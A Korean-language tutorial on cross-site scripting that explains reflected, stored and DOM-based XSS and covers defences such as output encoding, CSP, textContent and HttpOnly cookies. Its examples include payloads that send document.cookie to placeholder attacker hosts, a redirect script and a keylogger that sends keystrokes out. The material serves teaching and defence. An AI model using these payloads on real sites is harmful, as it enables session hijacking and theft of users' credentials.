# **XSS (Cross-Site Scripting)**

: 웹사이트에 악성 스크립트를 삽입하여 사용자의 브라우저에서 실행되도록 만드는 해킹 방법

공격자는 이를 이용해 쿠키 탈취, 세션 하이재킹, 피싱, 키로깅 등을 수행할 수 있다.

<br>
<br>

## **XSS 공격의 종류**

XSS 공격은 실행 방식에 따라 크게 **반사형(Reflected)**, **저장형(Stored)**, **DOM 기반(DOM-based)** 세 가지로 나뉜다.

<br>

### 1. 반사형 XSS (Reflected XSS)

: 공격자가 조작한 URL을 피해자가 클릭하면, 서버가 악성 스크립트를 포함한 응답을 반환하여 실행되는 방식

스크립트가 포함된 공격용 악성 URL을 만든 뒤, 사용자가 해당 URL을 클릭했을 때 정보를 획득하는 공격이다.
URL이 길면 클라이언트가 의구심을 가질 수 있기 때문에 URL 단축을 이용해 짧은 URL로 만들어 공격하기도 한다.

사용자가 특정 파라미터에 입력한 값을 서버가 응답으로 반사해서 보내줄 때 발생하며
서버에 스크립트를 저장하는 것이 아니므로 서버의 필터링을 피할 수 있다.

- URL을 만들어 클릭해 실행되게 하는 방식으로 **특정인을 대상**으로 한다.
- **URL 파라미터 데이터가 그대로 서버 응답에 삽입**되어 오는 곳에서 발생한다. 즉, 요청과 응답 페이지가 동일해야 한다.
- POST 방식은 공격에 활용할 여지가 없기 때문에 데이터 전달은 **GET 방식**이어야 한다.

<br>

공격자는 다음과 같은 URL을 생성한다.

````php-template
https://example.com/search?q=<script>alert('Hacked!');</script>```
````

피해자가 이 URL을 클릭하면, 서버는 `q`값 그대로 응답에 포함해 브라우저가 실행된다.

브라우저는 `<script>alert('Hacked!');</script>` 코드(예시)를 실행한다.

심각한 경우, 공격자는 세션 쿠키를 탈취할 수 있다.

<br>

### 2. 저장형 XSS (Stored XSS)

: 공격자가 직접 악성 스크립트를 데이터베이스에 저장하고, 해당 데이터를 웹 페이지에서 로드할 때 실행되는 방식

취약한 웹 서버에 악성 스크립트를 심어놓고, 사용자가 접근하면 해당 스크립드가 실행되는 공격이다.

보통 서버에서 필터링을 하기 때문에 공격을 우회하기 어렵지만, 한 번 성공하면 관리자 입장에서는 눈치채기 힘들고 **광범위한 피해**를 줄 수 있다는 것이 특징이다.

- 데이터가 **저장**되고, **출력**되는 곳에서 발생한다. 저장되는 페이지와 출력되는 페이지는 달라도 상관 없다.
- **접근하는 모든 사람에게 공격이 가능**하기 때문에 광역 수준의 위험도를 가진다.

<br>

공격자가 댓글이나 게시글 입력란에 악성 스크립트를 입력한다.

```php-template
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

서버는 해당 내용을 데이터베이스에 저장한 후, 페이지 로딩시 그대로 출력한다.

이후 페이지를 방문한 사용자들의 브라우저에서 스크립트가 실행되면서 쿠키가 공격자 서버로 전송된다.

공격자는 쿠키를 탈취하여 세션을 가로채거나 피해자의 계정에 접근할 수 있다.

<br>

### 3. DOM 기반 XSS (DOM-based XSS)

: 서버 응답이 아니라, 클라이언트 측 자바스크립트에서 DOM 조작을 통해 실행되는 방식

Reflected XSS와 Stored XSS 공격이 서버의 취약점을 이용해서 악성 스크립트가 포함된 응답 페이지를 전달하는 것인 반면,
DOM XSS는 서버와 관련없이 클라이언트 측에서 파라미터를 처리할 때 발생한다.

DOM XSS 공격은 사용자가 공격자에 의해 조작된 URL을 클릭하는 순간 악성 스크립트가 실행되면서 사용자 브라우저를 공격한다.

<br>

웹사이트가 URL 파라미터에서 데이터를 읽어 innerHTML에 삽입하는 경우

```javascript
document.getElementById("output").innerHTML = location.search;
```

<br>

공격자가 다음과 같은 URL을 생성한다.

```php-template
https://example.com/page?name=<script>alert('XSS!');</script>
```

페이지를 방문하면 `innerHTML`을 통해 `<script>`태그가 삽입되고 실행된다.

<br>
<br>

## **XSS 방어 방법**

### 1. 입력 값 검증 (Input Validation)

HTML, JavaScript, SQL 등에서 사용되는 특수문자를 필터링 한다.

`<`, `>`, `"`, `'`, `/`, `&` 등을 제거하거나 변환(escape)

<br>

### 2. 출력 시 인코딩 (Output Encoding)

서버에서 클라이언트로 데이터를 출력할 때 HTML Entity 인코딩을 적용한다.

```php
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

`<script>` → `&lt;script&gt;`로 변환되어 실행되지 않는다.

<br>

### 3. CSP(Content Security Policy) 적용

스크립트 실행을 제한하는 보안 정책을 설정한다.

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
```

외부에서 제공되는 스크립트를 차단한다.

<br>

### 4. JavaScript에서 `innerHTML` 대신 `textContent` 사용

`innerHTML`을 사용하면 악성 코드가 실행될 위험이 있다.

```javascript
document.getElementById("output").textContent = location.search;
```

<br>

### 5. 쿠키에 `HttpOnly` 옵션 적용

`HttpOnly`를 설정하면 JavaScript에서 `document.cookie`로 접근할 수 없으므로 쿠키 탈취를 방지할 수 있다.

```php
setcookie("session", "abcdef", [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

<br>
<br>

## **XSS 공격 시나리오**

### 1. 쿠키 탈취

```php-template
<script>
new Image().src = "http://공격자사이트.com/~~?cookie=".concat(document.cookie);
</script>
```

<br>

### 2. 악의적인 페이지로 리다이렉트

```php-template
<script>
location.href = "https://악의적인사이트.com/~~"
</script>
```

<br>

### 3.키로거를 이용한 정보 탈취

```javascript
el.addEventListener("keyup", () => {
  new Image().src = "http://공격자사이트.com/~~?cookie=".concat(event.key);
});
```
